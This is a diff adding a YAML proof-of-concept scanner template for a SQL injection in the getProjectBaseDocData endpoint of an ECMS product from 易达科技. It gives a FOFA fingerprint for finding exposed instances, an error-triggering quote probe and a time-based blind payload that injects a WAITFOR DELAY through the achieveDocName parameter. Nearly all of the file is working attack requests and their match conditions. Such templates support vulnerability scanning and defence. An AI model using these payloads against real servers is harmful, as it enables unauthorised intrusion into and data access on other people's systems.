@@ -1,0 +1,27 @@
+id: poc-yaml-gczj-ecms-getprojectbasedocdata-sqli
+info:
+  name: 易达科技-ECMS getProjectBaseDocData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ecms
+  fofa: app="易达科技-ECMS"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1'
+  expression: status_code == 500 && contains(body,"\"success\":false") && contains(body,"你访问的页面出错")
+- method: GET
+  path: /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    body == `{"total":0,"rows":[]}` &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
